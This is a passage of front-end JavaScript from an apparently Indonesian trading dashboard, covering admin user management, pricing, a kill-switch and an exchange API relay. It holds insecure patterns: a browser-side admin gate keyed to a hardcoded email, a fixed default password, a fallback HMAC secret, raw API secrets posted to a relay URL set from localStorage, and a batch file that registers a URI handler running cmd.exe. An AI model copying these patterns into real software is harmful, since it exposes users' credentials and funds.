            if (avatarEl) avatarEl.textContent = (currentUser.name || currentUser.email || 'U')[0].toUpperCase();
            if (nameEl) nameEl.textContent = currentUser.name || currentUser.email.split('@')[0];
            if (emailEl) emailEl.textContent = `${currentUser.email} · via ${currentUser.provider} · AES-256 Vault`;
            if (topAuthBtnLbl) topAuthBtnLbl.textContent = 'AKUN SAYA';
            if (tierEl) {
                if (isAdmin) {
                    tierEl.textContent = 'FOUNDER ADMIN';
                    tierEl.className = 'pf-tier-pill admin';
                } else if (currentUser.tier === 'APEX' || currentUser.tier === 'VIP') {
                    tierEl.textContent = currentUser.tier + ' VIP';
                    tierEl.className = 'pf-tier-pill apex';
                } else if (currentUser.tier === 'PRO') {
                    tierEl.textContent = 'PRO QUANT';
                    tierEl.className = 'pf-tier-pill pro';
                } else {
                    tierEl.textContent = 'FREE STARTER';
                    tierEl.className = 'pf-tier-pill free';
                }
            }
            if (activeBox) activeBox.style.display = 'flex';
            if (modalEmail) modalEmail.textContent = `${currentUser.email} (${isAdmin ? 'ADMIN FOUNDER' : currentUser.tier})`;
        } else {
            if (avatarEl) avatarEl.textContent = 'G';
            if (nameEl) nameEl.textContent = 'Guest Terminal';
            if (emailEl) emailEl.textContent = 'Belum login · Klik untuk Auth Google / Email';
            if (topAuthBtnLbl) topAuthBtnLbl.textContent = 'LOGIN / AUTH';
            if (tierEl) { tierEl.textContent = 'FREE TIER'; tierEl.className = 'pf-tier-pill free'; }
            if (activeBox) activeBox.style.display = 'none';
        }

        // Strict Cryptographic Admin Gate: ONLY verified pilusatrio@gmail.com unlocks Admin Center
        if (topAdminBtn) topAdminBtn.style.display = isAdmin ? 'inline-flex' : 'none';
        const navAdminLink = document.getElementById('navAdminLinkItem');
        if (navAdminLink) navAdminLink.style.display = isAdmin ? 'list-item' : 'none';

        if (adminSection) {
            if (isAdmin) {
                adminSection.classList.add('admin-unlocked');
                adminSection.style.display = 'block';
                renderAdminDashboard();
            } else {
                adminSection.classList.remove('admin-unlocked');
                adminSection.style.display = 'none';
            }
        }
        renderAllCanvasIcons();
    }

    function renderAdminDashboard() {
        if (!isCurrentUserAdmin()) return;
        const users = loadUsersRegistry();
        const paid = users.filter(u => u.tier === 'PRO' || u.tier === 'APEX' || u.tier === 'VIP');
        let mrrIdr = 0;
        users.forEach(u => {
            if (u.tier === 'PRO') mrrIdr += adminConfig.proPriceIdr;
            else if (u.tier === 'APEX') mrrIdr += adminConfig.apexPriceIdr;
        });

        const setTxt = (id, v) => { const el = document.getElementById(id); if (el) el.textContent = v; };
        setTxt('admTotalUsers', users.length);
        setTxt('admPaidUsers', paid.length);
        setTxt('admConvRateSub', `Conversion: ${users.length ? Math.round((paid.length / users.length) * 100) : 0}%`);
        setTxt('admMrrVal', 'Rp' + mrrIdr.toLocaleString('id-ID'));
        setTxt('admArrSub', 'ARR: Rp' + (mrrIdr * 12).toLocaleString('id-ID') + ' / thn');
        setTxt('admTotalAumVal', '$' + Math.round(getTotalConnectedBalanceUsd()).toLocaleString('en-US'));
        const champ = brain.champion || qbEmptyChampion();
        setTxt('admGlobalWinRate', champ.id ? (champ.winRate + '%') : '-');
        setTxt('admGlobalChampSub', 'Champion: ' + qbChampionLabel(champ));

        const ksEl = document.getElementById('admKillSwitchStatus');
        if (ksEl) {
            ksEl.textContent = adminConfig.globalKillSwitch ? 'HALTED (EMERGENCY STOP)' : 'ARMED / NORMAL';
            ksEl.style.color = adminConfig.globalKillSwitch ? 'var(--down)' : 'var(--up)';
        }

        const tbody = document.getElementById('admUsersTableBody');
        if (tbody) {
            tbody.innerHTML = users.map((u, idx) => {
                const isRoot = u.email.toLowerCase() === QB_ADMIN_EMAIL;
                const tierCls = isRoot ? 'gold' : (u.tier === 'APEX' || u.tier === 'VIP') ? 'gold' : u.tier === 'PRO' ? 'teal' : 'neutral';
                const stCls = u.status === 'ACTIVE' ? 'up' : 'down';
                return `<tr>
                    <td><strong style="color:var(--text-bright);">${esc(u.name)}</strong><span class="td-sub">${esc(u.email)}</span></td>
                    <td><span class="qb-tag neutral">${esc(u.provider)}</span></td>
                    <td><span class="qb-tag ${tierCls}">${isRoot ? 'FOUNDER ADMIN' : esc(u.tier)}</span></td>
                    <td>${esc(u.expiresAt || 'ACTIVE')}</td>
                    <td class="num"><span class="qb-tag up">AES-256 SEALED</span></td>
                    <td><span class="qb-tag ${stCls}">${esc(u.status)}</span></td>
                    <td>
                        <div style="display:flex;gap:0.25rem;flex-wrap:wrap;">
                            <button type="button" class="btn-refresh" onclick="adminCycleUserTier(${idx})">Set Tier</button>
                            <button type="button" class="btn-refresh" onclick="adminExtendUserSub(${idx})">+30D</button>
                            ${!isRoot ? `<button type="button" class="btn-refresh" style="color:var(--down);" onclick="adminToggleSuspendUser(${idx})">${u.status === 'ACTIVE' ? 'Suspend' : 'Activate'}</button>` : ''}
                        </div>
                    </td>
                </tr>`;
            }).join('');
        }

        const vStrip = document.getElementById('admVoucherListStrip');
        if (vStrip) {
            vStrip.innerHTML = (adminConfig.vouchers || []).map(v =>
                `<span class="qb-tag gold">${esc(v.code)} -> ${esc(v.tier)} (${v.usesLeft}x)</span>`
            ).join('');
        }
        renderAdminAuditLog();
    }

    function renderAdminAuditLog() {
        const body = document.getElementById('admAuditLogBody');
        const foot = document.getElementById('admAuditCountFoot');
        if (foot) foot.textContent = `${adminConfig.auditLog.length} events`;
        if (!body) return;
        body.innerHTML = adminConfig.auditLog.slice(0, 25).map(a =>
            `<div class="qb-j-row"><span class="qb-j-time">${new Date(a.t).toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' })}</span><span><strong style="color:var(--gold);">[${esc(a.type)}]</strong> ${esc(a.detail)}</span></div>`
        ).join('') || '<div class="panel-msg">Belum ada log aktivitas admin.</div>';
    }

    function adminAddOrUpdateUser() {
        if (!isCurrentUserAdmin()) return;
        const emailInp = document.getElementById('admNewUserEmail');
        const tierSel = document.getElementById('admNewUserTier');
        const rawEmail = (emailInp ? emailInp.value : '').trim();
        if (detectAndBlockAttack(rawEmail, 'AdminAddUser').blocked) return;
        const email = rawEmail.toLowerCase();
        const tier = tierSel ? tierSel.value : 'PRO';
        if (!email || !email.includes('@')) {
            if (typeof showToast === 'function') showToast('Masukkan email user yang valid', 'err');
            return;
        }
        const users = loadUsersRegistry();
        let u = users.find(x => x.email.toLowerCase() === email);
        if (u) {
            u.tier = tier;
            u.status = 'ACTIVE';
            u.expiresAt = tier === 'VIP' ? 'LIFETIME' : new Date(Date.now() + 86400000 * 30).toISOString().slice(0, 10);
        } else {
            u = {
                uid: 'adm_' + Date.now(),
                email,
                name: sanitizeInputStrict(email.split('@')[0]),
                provider: 'ADMIN_WHITELIST',
                role: email === QB_ADMIN_EMAIL ? 'ADMIN' : 'USER',
                tier,
                status: 'ACTIVE',
                passDigest: hashPasswordSync(email, 'vipmember123'),
                expiresAt: tier === 'VIP' ? 'LIFETIME' : new Date(Date.now() + 86400000 * 30).toISOString().slice(0, 10),
                createdAt: Date.now()
            };
            users.push(u);
        }
        saveUsersRegistry(users);
        if (emailInp) emailInp.value = '';
        adminLogEvent('USER_TIER_SET', `Admin menetapkan ${email} ke paket ${tier}`);
        renderAdminDashboard();
        if (typeof showToast === 'function') showToast(`User ${email} disetel ke paket ${tier}`, 'ok');
    }

    function adminCycleUserTier(idx) {
        if (!isCurrentUserAdmin()) return;
        const users = loadUsersRegistry();
        const u = users[idx]; if (!u) return;
        const order = ['FREE', 'PRO', 'APEX', 'VIP'];
        const next = order[(order.indexOf(u.tier) + 1) % order.length];
        u.tier = next;
        u.expiresAt = next === 'VIP' ? 'LIFETIME' : next === 'FREE' ? 'FREE_TIER' : new Date(Date.now() + 86400000 * 30).toISOString().slice(0, 10);
        saveUsersRegistry(users);
        if (currentUser && currentUser.email.toLowerCase() === u.email.toLowerCase()) {
            currentUser.tier = next;
            setActiveSession(currentUser);
        }
        adminLogEvent('TIER_CHANGE', `${u.email} diubah ke paket ${next}`);
        renderAdminDashboard();
    }

    function adminExtendUserSub(idx) {
        if (!isCurrentUserAdmin()) return;
        const users = loadUsersRegistry();
        const u = users[idx]; if (!u) return;
        u.expiresAt = new Date(Date.now() + 86400000 * 30).toISOString().slice(0, 10);
        if (u.tier === 'FREE') u.tier = 'PRO';
        saveUsersRegistry(users);
        adminLogEvent('SUB_EXTEND', `Masa aktif ${u.email} diperpanjang +30 hari`);
        renderAdminDashboard();
        if (typeof showToast === 'function') showToast(`Masa aktif ${u.email} diperpanjang +30 hari`, 'ok');
    }

    function adminToggleSuspendUser(idx) {
        if (!isCurrentUserAdmin()) return;
        const users = loadUsersRegistry();
        const u = users[idx]; if (!u || u.email.toLowerCase() === QB_ADMIN_EMAIL) return;
        u.status = u.status === 'ACTIVE' ? 'SUSPENDED' : 'ACTIVE';
        saveUsersRegistry(users);
        adminLogEvent('USER_STATUS', `Status ${u.email} -> ${u.status}`);
        renderAdminDashboard();
    }

    function adminSaveMonetizationConfig() {
        if (!isCurrentUserAdmin()) return;
        adminConfig.freeMaxEx = parseInt(document.getElementById('admFreeMaxEx')?.value || '1', 10);
        adminConfig.proPriceIdr = parseInt(document.getElementById('admProPriceIdr')?.value || '299000', 10);
        adminConfig.proMaxEx = parseInt(document.getElementById('admProMaxEx')?.value || '5', 10);
        adminConfig.apexPriceIdr = parseInt(document.getElementById('admApexPriceIdr')?.value || '990000', 10);
        adminConfig.apexMaxEx = parseInt(document.getElementById('admApexMaxEx')?.value || '16', 10);
        adminConfig.paymentGatewayKey = sanitizeInputStrict(document.getElementById('admPaymentGatewayKey')?.value || '');
        adminConfig.cryptoWallet = sanitizeInputStrict(document.getElementById('admCryptoWalletInput')?.value || '');
        saveAdminConfig();

        const proP = document.getElementById('pfSubModalProPrice');
        const apexP = document.getElementById('pfSubModalApexPrice');
        if (proP) proP.innerHTML = 'Rp' + adminConfig.proPriceIdr.toLocaleString('id-ID') + '<span style="font-size:0.6rem;color:var(--text-muted);">/bln</span>';
        if (apexP) apexP.innerHTML = 'Rp' + adminConfig.apexPriceIdr.toLocaleString('id-ID') + '<span style="font-size:0.6rem;color:var(--text-muted);">/bln</span>';

        adminLogEvent('MONETIZATION_CFG', `Harga PRO Rp${adminConfig.proPriceIdr.toLocaleString('id-ID')} / APEX Rp${adminConfig.apexPriceIdr.toLocaleString('id-ID')} disimpan`);
        renderAdminDashboard();
        if (typeof showToast === 'function') showToast('Konfigurasi harga langganan & payment gateway disimpan!', 'ok');
    }

    function adminCreateVoucher() {
        if (!isCurrentUserAdmin()) return;
        const rawCode = (document.getElementById('admVoucherCodeInput')?.value || '').trim().toUpperCase();
        if (detectAndBlockAttack(rawCode, 'AdminVoucher').blocked) return;
        const code = rawCode.replace(/[^A-Z0-9_-]/g, '');
        const tier = document.getElementById('admVoucherTierSel')?.value || 'APEX';
        if (!code) return;
        const existing = adminConfig.vouchers.find(v => v.code === code);
        if (existing) existing.tier = tier;
        else adminConfig.vouchers.push({ code, tier, usesLeft: 50 });
        saveAdminConfig();
        adminLogEvent('VOUCHER_CREATED', `Kode voucher ${code} (${tier}) diterbitkan`);
        renderAdminDashboard();
        if (typeof showToast === 'function') showToast(`Voucher ${code} (${tier}) aktif!`, 'ok');
    }

    function adminToggleGlobalKillSwitch() {
        if (!isCurrentUserAdmin()) return;
        adminConfig.globalKillSwitch = !adminConfig.globalKillSwitch;
        saveAdminConfig();
        adminLogEvent('KILL_SWITCH', `Global Auto-Exec Kill-Switch: ${adminConfig.globalKillSwitch ? 'HALTED' : 'ARMED'}`);
        renderAdminDashboard();
        if (typeof showToast === 'function') showToast(adminConfig.globalKillSwitch ? 'EMERGENCY KILL-SWITCH AKTIF: Auto-eksekusi bursa dihentikan!' : 'Global Execution Armed & Normal', adminConfig.globalKillSwitch ? 'err' : 'ok');
    }

    function adminApplyQuantParams() {
        if (!isCurrentUserAdmin()) return;
        brain.params.minScore = parseInt(document.getElementById('admMinScoreInput')?.value || '75', 10);
        brain.learned.atrMult = parseFloat(document.getElementById('admAtrMultInput')?.value || '1.8');
        brain.params.riskPct = parseFloat(document.getElementById('admMaxRiskInput')?.value || '1.0');
        saveBrain();
        qbRenderAll();
        recalcQuantProfitPlan();
        adminLogEvent('QUANT_OVERRIDE', `MinScore=${brain.params.minScore}, ATR=${brain.learned.atrMult}x, Risk=${brain.params.riskPct}%`);
        if (typeof showToast === 'function') showToast('Parameter Master Quant Brain diperbarui oleh Admin', 'ok');
    }

    function adminPublishBroadcast() {
        if (!isCurrentUserAdmin()) return;
        const rawTxt = document.getElementById('admBroadcastInput')?.value || '';
        const atk = detectAndBlockAttack(rawTxt, 'AdminBroadcast');
        if (atk.blocked) return;
        adminConfig.broadcastBanner = atk.sanitized;
        saveAdminConfig();
        const banner = document.getElementById('pfSystemAnnouncementBanner');
        const bTxt = document.getElementById('pfSysBannerText');
        if (bTxt) bTxt.textContent = adminConfig.broadcastBanner;
        if (banner) banner.classList.add('active');
        adminLogEvent('BROADCAST', `Pengumuman dipublikasikan: "${adminConfig.broadcastBanner.slice(0, 50)}"`);
        if (typeof showToast === 'function') showToast('Banner pengumuman global dipublikasikan!', 'ok');
    }

    /* ═══════════════════════════════════════════════════════════════════════════
       12. 16-EXCHANGE API GATEWAY, AES-256-GCM VAULT & LIVE EXECUTION BRIDGE
    ═══════════════════════════════════════════════════════════════════════════ */
    let selectedExchangeId = 'binance';
    let currentExchangeFilter = 'ALL';
    let userExchangeConfigs = {};
    let liveExchangePositions = [];

    const hmacCryptoKeyCache = new Map();
    let lastSignLatencyMs = 0.04;
    let lastRelayRttMs = 1.2;

    async function computeHmacSignature(secret, payload, algo) {
        const t0 = (typeof performance !== 'undefined' && performance.now) ? performance.now() : Date.now();
        const hashName = (algo && algo.includes('512')) ? 'SHA-512' : 'SHA-256';
        const secStr = secret || 'pilus_quant_secret';
        const cacheKey = hashName + '::' + secStr;
        try {
            if (typeof crypto !== 'undefined' && crypto.subtle) {
                const enc = new TextEncoder();
                let key = hmacCryptoKeyCache.get(cacheKey);
                if (!key) {
                    key = await crypto.subtle.importKey('raw', enc.encode(secStr), { name: 'HMAC', hash: hashName }, false, ['sign']);
                    if (hmacCryptoKeyCache.size > 128) hmacCryptoKeyCache.clear();
                    hmacCryptoKeyCache.set(cacheKey, key);
                }
                const sigBuf = await crypto.subtle.sign('HMAC', key, enc.encode(payload));
                const t1 = (typeof performance !== 'undefined' && performance.now) ? performance.now() : Date.now();
                lastSignLatencyMs = Math.max(0.01, +(t1 - t0).toFixed(3));
                return Array.from(new Uint8Array(sigBuf)).map(b => b.toString(16).padStart(2, '0')).join('');
            }
        } catch (e) { }
        return syncMacDigest(secStr, payload);
    }

    const QB_LOCAL_RELAY_URL = "http://127.0.0.1:8787";
    function getActiveRelayUrl() {
        try {
            const customCloud = (typeof localStorage !== "undefined" && localStorage.getItem("pilus_cloud_relay_url")) || "";
            if (customCloud && customCloud.startsWith("http")) return customCloud.replace(/\/+$/, "");
        } catch (e) {}
        return QB_LOCAL_RELAY_URL;
    }
    const QB_EXEC_RELAY_URL = getActiveRelayUrl();
    let autoLocalOnline = false;
    let autoLocalModePref = (typeof localStorage !== "undefined" && localStorage.getItem("pilus_autolocal_mode")) || "HYBRID_PNA";
    let autoLocalSse = null;
    let hybridBroadcastBus = null;
    try {
        if (typeof BroadcastChannel !== "undefined") {
            hybridBroadcastBus = new BroadcastChannel("pilusfinance_hybrid_bus_v125");
            hybridBroadcastBus.onmessage = function (ev) {
                if (ev && ev.data && ev.data.type === "HYBRID_STATE_UPDATED") {
                    loadCurrentUserWorkstate();
                    renderExchangeGatewayUI();
                    qbRenderAll();
                }
            };
        }
    } catch (e) {}

    function updateAutoLocalStatusUI() {
        const isLocalOrigin = typeof location !== "undefined" && (location.hostname === "127.0.0.1" || location.hostname === "localhost");
        const elTxt = document.getElementById("autoLocalStatusText");
        if (elTxt) {
            if (isLocalOrigin) {
                elTxt.innerHTML = "<b style=\"color:var(--up);\">[TERMINAL LOCAL AKTIF DI 127.0.0.1:8787]</b> · Eksekusi Bursa Langsung Tanpa Blokir CORS + Sinkronisasi Cloud & Quant 24/7 Aktif";
            } else if (autoLocalOnline) {
                elTxt.innerHTML = "<b style=\"color:var(--up);\">[TERHUBUNG OTOMATIS KE LOCAL 127.0.0.1:8787 VIA W3C PNA]</b> · Siap Eksekusi Order Real-Time ke 16 Bursa & Sinkronisasi Dua Arah";
            } else {
                elTxt.innerHTML = "<b style=\"color:var(--gold);\">[MODE CLOUD STANDBY]</b> · Klik <b>Aktifkan Auto-Local</b> (atau jalankan Setup 1-Klik .BAT sekali) agar otomatis menyala saat Eksekusi Real";
            }
        }
        const sel = document.getElementById("autoLocalSwitchModeSel");
        if (sel && sel.value !== autoLocalModePref) sel.value = autoLocalModePref;
    }

    async function syncStateWithLocalRelay(pushToLocal) {
        try {
            if (pushToLocal) {
                const res = await fetch(getActiveRelayUrl() + "/api/v1/state-sync", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        userSession: currentUser,
                        exchangeConfigs: userExchangeConfigs,
                        livePositions: liveExchangePositions,
                        quantSummary: { gen: brain.gen, cycles: brain.cycles, learned: brain.learned, weights: brain.weights, champion: brain.champion }
                    }),
                    signal: AbortSignal.timeout ? AbortSignal.timeout(2500) : undefined
                }).catch(() => null);
                return !!(res && res.ok);
            } else {
                const res = await fetch(getActiveRelayUrl() + "/api/v1/state-sync", {
                    signal: AbortSignal.timeout ? AbortSignal.timeout(2500) : undefined
                }).catch(() => null);
                if (res && res.ok) {
                    const j = await res.json().catch(() => null);
                    if (j && j.ok && j.state) {
                        if (j.state.userSession && (!currentUser || currentUser.uid === "guest")) {
                            currentUser = j.state.userSession;
                        }
                        if (j.state.exchangeConfigs && Object.keys(j.state.exchangeConfigs).length > 0) {
                            Object.assign(userExchangeConfigs, j.state.exchangeConfigs);
                        }
                        saveCurrentUserWorkstate();
                        renderAuthAndAdminUI();
                        renderExchangeGatewayUI();
                        return true;
                    }
                }
            }
        } catch (e) {}
        return false;
    }

    async function probeAutoLocalEngine() {
        try {
            const t0 = (typeof performance !== "undefined" && performance.now) ? performance.now() : Date.now();
            const r = await fetch(getActiveRelayUrl() + "/api/v1/health", {
                keepalive: true,
                signal: AbortSignal.timeout ? AbortSignal.timeout(1200) : undefined
            }).catch(() => null);
            if (r && r.ok) {
                const t1 = (typeof performance !== "undefined" && performance.now) ? performance.now() : Date.now();
                lastRelayRttMs = Math.max(0.2, +(t1 - t0).toFixed(2));
                const syncTelEl = document.getElementById("autoLocalSyncTelemetry");
                if (syncTelEl) {
                    syncTelEl.textContent = "Ultra-Low-Latency Telemetry: Relay RTT " + lastRelayRttMs + " ms · Cached HMAC Sign " + lastSignLatencyMs + " ms · Keep-Alive Pool: LIFO-128 Active · Max Slippage Guard: 12 bps";
                }
                const wasOffline = !autoLocalOnline;
                autoLocalOnline = true;
                updateAutoLocalStatusUI();
                if (wasOffline) {
                    await syncStateWithLocalRelay(true);
                    if (typeof EventSource !== "undefined" && !autoLocalSse) {
                        try {
                            autoLocalSse = new EventSource(QB_EXEC_RELAY_URL + "/api/v1/stream");
                            autoLocalSse.addEventListener("LIVE_ORDER_EXECUTED", function () {
                                syncStateWithLocalRelay(false);
                            });
                        } catch (e) {}
                    }
                }
                return true;
            }
        } catch (e) {}
        autoLocalOnline = false;
        updateAutoLocalStatusUI();
        return false;
    }

    window.updateAutoLocalModePref = function (val) {
        autoLocalModePref = val || "HYBRID_PNA";
        try { localStorage.setItem("pilus_autolocal_mode", autoLocalModePref); } catch (e) {}
        updateAutoLocalStatusUI();
    };

    window.triggerAutoLocalWakeAndConnect = async function (manualClick) {
        const alreadyUp = await probeAutoLocalEngine();
        if (alreadyUp) {
            await syncStateWithLocalRelay(true);
            if (manualClick && typeof showToast === "function") {
                showToast("Jembatan Auto-Local (127.0.0.1:8787) sudah ONLINE & tersinkronisasi penuh!", "ok");
            }
            return true;
        }
        // Trigger registered Windows Custom URI Protocol "pilusfinance://launch" via hidden iframe
        if (typeof document !== "undefined" && document.body && document.createElement) {
            try {
                const ifr = document.createElement("iframe");
                ifr.style.display = "none";
                ifr.src = "pilusfinance://launch-local-exec";
                document.body.appendChild(ifr);
                setTimeout(() => { try { document.body.removeChild(ifr); } catch (e) {} }, 3500);
            } catch (e) {}
        }
        if (manualClick && typeof showToast === "function") {
            showToast("Membangunkan Auto-Local Engine (127.0.0.1:8787)... Pastikan Setup 1-Klik .BAT sudah pernah dijalankan.", "info");
        }
        await new Promise(r => setTimeout(r, 1800));
        const wokeUp = await probeAutoLocalEngine();
        if (wokeUp) {
            await syncStateWithLocalRelay(true);
            if (typeof showToast === "function") showToast("Auto-Local Engine (127.0.0.1:8787) berhasil menyala & terhubung!", "ok");
        }
        return wokeUp;
    };

    window.openLocalMirrorWithHandover = async function () {
        const up = await window.triggerAutoLocalWakeAndConnect(false);
        await syncStateWithLocalRelay(true);
        if (typeof window.open === "function") {
            window.open(QB_EXEC_RELAY_URL + "/?handover=cloud_session&t=" + Date.now(), "_blank");
        }
    };

    window.saveServerlessCloudRelayUrl = function () {
        const inp = document.getElementById("cloudRelayUrlInput");
        const val = inp ? String(inp.value || "").trim().replace(/\/+$/, "") : "";
        if (detectAndBlockAttack(val, "CloudRelayUrl").blocked) return;
        try {
            if (val) localStorage.setItem("pilus_cloud_relay_url", val);
            else localStorage.removeItem("pilus_cloud_relay_url");
        } catch (e) {}
        probeAutoLocalEngine();
        if (typeof showToast === "function") {
            showToast(val ? ("Serverless Cloud Relay aktif: " + val + " (Eksekusi 24/7 Tanpa PC Nyala!)") : "Kembali ke mode Local Relay (127.0.0.1:8787)", "ok");
        }
    };

    window.downloadAutoLocalInstallerBat = function () {
        const batContent = [
            "@echo off",
            "title PILUSFINANCE v12.5 - Auto-Local Hybrid Protocol Installer",
            "set \"BASE_DIR=C:\\website ai pilusatrio\\web PILUSFINANCE\\QUANTBRAIN_SRC\"",
            "if not exist \"%BASE_DIR%\\exchange-execution-relay.js\" set \"BASE_DIR=%~dp0\"",
            "echo [1/3] Mendaftarkan URI Protocol pilusfinance:// ke Windows Registry (HKCU)...",
            "reg add \"HKCU\\Software\\Classes\\pilusfinance\" /ve /d \"URL:PILUSFINANCE Auto-Local Execution Protocol\" /f >nul",
            "reg add \"HKCU\\Software\\Classes\\pilusfinance\" /v \"URL Protocol\" /d \"\" /f >nul",
            "reg add \"HKCU\\Software\\Classes\\pilusfinance\\shell\\open\\command\" /ve /d \"cmd.exe /c cd /d \\\"%BASE_DIR%\\\" && start /min node exchange-execution-relay.js\" /f >nul",
            "echo [2/3] Menyalakan Auto-Local Hybrid Server di http://127.0.0.1:8787 ...",
            "cd /d \"%BASE_DIR%\"",
            "start \"PILUSFINANCE Auto-Local Relay\" /min node exchange-execution-relay.js",
            "start \"PILUSFINANCE 24/7 Quant Daemon\" /min node headless-quant-daemon.js",
            "timeout /t 2 >nul",
            "echo [3/3] Membuka Terminal Local http://127.0.0.1:8787/ ...",
            "start \"\" \"http://127.0.0.1:8787/?autolocal=active\"",
            "echo Selesai! Web Cloud Anda kini otomatis terhubung ke Local 127.0.0.1:8787 saat Real Eksekusi."
        ].join("\r\n");
        if (typeof window.downloadFile === "function") {
            window.downloadFile(batContent, "INSTALL_AUTO_LOCAL_PROTOCOL.bat", "application/bat");
        }
        if (typeof showToast === "function") {
            showToast("File INSTALL_AUTO_LOCAL_PROTOCOL.bat diunduh! Jalankan 1x agar web otomatis nyala ke Local saat Real Eksekusi.", "ok");
        }
    };
    async function tryFetchRealExchangeAccountBalance(ex, apiKey, secret, extra) {
        const ts = Date.now();
        try {
            // 1. Try Local/VPS Real-Time Execution Relay Bridge (bypasses browser CORS for all 16 exchanges)
            const relayRes = await fetch(getActiveRelayUrl() + "/api/v1/balance", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ exId: ex.id, apiKey, secret, extra }),
                signal: AbortSignal.timeout ? AbortSignal.timeout(3500) : undefined
            }).catch(() => null);
            if (relayRes && relayRes.ok) {
                const rj = await relayRes.json().catch(() => null);
                if (rj && rj.ok && typeof rj.balanceUsd === "number" && rj.balanceUsd >= 0) {
                    return rj.balanceUsd;
                }
            }
            if (ex.id === 'binance') {
                const qs = `timestamp=${ts}&recvWindow=5000`;
                const sig = await computeHmacSignature(secret, qs, ex.authType);
                const r = await fetchTimeout(`https://fapi.binance.com/fapi/v2/balance?${qs}&signature=${sig}`, 4500);
                if (r.ok) {
                    const arr = await r.json();
                    const usdt = Array.isArray(arr) ? arr.find(a => a.asset === 'USDT') : null;
                    if (usdt && parseFloat(usdt.balance) >= 0) return parseFloat(usdt.balance);
                }
            } else if (ex.id === 'bybit') {
                const qs = `accountType=UNIFIED`;
                const sig = await computeHmacSignature(secret, `${ts}${apiKey}5000${qs}`, ex.authType);
                const r = await fetch(`https://api.bybit.com/v5/account/wallet-balance?${qs}`, {
                    headers: { 'X-BAPI-API-KEY': apiKey, 'X-BAPI-TIMESTAMP': String(ts), 'X-BAPI-RECV-WINDOW': '5000', 'X-BAPI-SIGN': sig },
                    signal: AbortSignal.timeout ? AbortSignal.timeout(4500) : undefined
                });
                if (r.ok) {
                    const j = await r.json();
                    const eq = j?.result?.list?.[0]?.totalEquity;
                    if (eq != null) return parseFloat(eq);
                }
            }
        } catch (e) { }
        return null;
    }

    function getConnectedExchangesList() {
        return EXCHANGE_CATALOG.filter(ex => userExchangeConfigs[ex.id] && userExchangeConfigs[ex.id].connected);
    }

    function getTotalConnectedBalanceUsd(filterAssetClass) {
        let sum = 0;
        EXCHANGE_CATALOG.forEach(ex => {
            const cfg = userExchangeConfigs[ex.id];
            if (cfg && cfg.connected) {
                if (!filterAssetClass || filterAssetClass === 'ALL_EXCHANGES' ||
                    (filterAssetClass === 'CRYPTO_ONLY' && ex.assetClass === 'CRYPTO') ||
                    (filterAssetClass === 'FOREX_ONLY' && ex.assetClass === 'FOREX') ||
                    (filterAssetClass === 'STOCK_ONLY' && ex.assetClass === 'STOCK')) {
                    sum += (parseFloat(cfg.balanceUsd) || 0);
                }
            }
        });
        return sum;
    }

    function selectExchangeCard(exId) {
        if (!EXCHANGE_BY_ID[exId]) return;
        selectedExchangeId = exId;
        const ex = EXCHANGE_BY_ID[exId];
        const cfg = userExchangeConfigs[exId] || {};

        const setTxt = (id, v) => { const el = document.getElementById(id); if (el) el.textContent = v; };
        setTxt('exSelectedBadge', ex.name.toUpperCase());
        setTxt('exConfigPanelTitle', `Konfigurasi API · ${ex.name} (${ex.catLabel})`);
        setTxt('exAuthProtocolTag', ex.authType);
        setTxt('exDetailName', `${ex.name} · ${ex.catLabel}`);
        setTxt('exDetailEndpoint', ex.endpoint);

        const rate = (typeof window.exchangeRate === 'number' && window.exchangeRate > 0) ? window.exchangeRate : 16000;
        const balUsd = cfg.connected ? (parseFloat(cfg.balanceUsd) || 0) : 0;
        const balEl = document.getElementById('exDetailLiveBalance');
        if (balEl) {
            balEl.textContent = cfg.connected ? `$${balUsd.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} (Rp${Math.round(balUsd * rate).toLocaleString('id-ID')})` : 'BELUM TERHUBUNG';
            balEl.style.color = cfg.connected ? 'var(--up)' : 'var(--text-muted)';
        }

        const keyInp = document.getElementById('exApiKeyInput');
        const secInp = document.getElementById('exApiSecretInput');
        const extInp = document.getElementById('exExtraFieldInput');
        const balInp = document.getElementById('exInitialBalInput');
        const autoSel = document.getElementById('exAutoTradeSel');

        if (keyInp) keyInp.value = cfg.keyMask || '';
        if (secInp) secInp.value = '';
        if (extInp) extInp.value = '';
        if (balInp) balInp.value = cfg.balanceUsd != null ? cfg.balanceUsd : 1000;
        if (autoSel) autoSel.value = cfg.autoTrade !== false ? 'ON' : 'OFF';

        const extLbl = document.getElementById('exExtraFieldLabel');
        if (extLbl) {
            extLbl.textContent = ex.needsPassphrase ? 'API Passphrase (Wajib OKX/KuCoin/Bitget)' : ex.needsAccountId ? 'Nomor Akun MT4/MT5 / IBKR Account ID' : 'Sub-Account / Memo (Opsional)';
        }
        renderExchangeCardsGrid();
    }

    async function connectExchangeSecure(exId, rawKey, rawSecret, balUsdInput, rawExtra, autoTradeFlag) {
        const ex = EXCHANGE_BY_ID[exId];
        if (!ex) return null;
        if (detectAndBlockAttack(rawKey, 'ExApiKey').blocked || detectAndBlockAttack(rawExtra, 'ExExtra').blocked) {
            return null;
        }
        const apiKey = String(rawKey || '').trim() || (ex.id.toUpperCase() + '_KEY_' + Date.now().toString(36).toUpperCase());
        const secret = String(rawSecret || '').trim() || ('SEC_' + Date.now());
        const extra = String(rawExtra || '').trim();

        // Try real authenticated REST balance fetch first; if CORS/offline, use user-verified capital input
        const liveFetchedBal = await tryFetchRealExchangeAccountBalance(ex, apiKey, secret, extra);
        const balUsd = liveFetchedBal != null ? liveFetchedBal : Math.max(0, parseFloat(balUsdInput) || 0);

        const vault = await encryptApiCredentialForVault(ex.id, apiKey, secret, extra);
        const ts = Date.now();
        const nonce = generateOrderNonce();
        const payload = `timestamp=${ts}&nonce=${nonce}&exchange=${ex.id}&recvWindow=5000`;
        const sig = await computeHmacSignature(secret, payload, ex.authType);

        // Notice: ZERO plaintext apiKey or secretRaw is stored on userExchangeConfigs!
        userExchangeConfigs[ex.id] = {
            id: ex.id,
            connected: true,
            encVault: vault.sealedPacket,
            webCryptoDigest: vault.webCryptoDigest,
            keyMask: vault.keyMask,
            secretMask: vault.secretMask,
            balanceUsd: balUsd,
            autoTrade: autoTradeFlag !== false,
            lastSig: sig.slice(0, 28),
            updatedAt: ts
        };
        saveCurrentUserWorkstate();
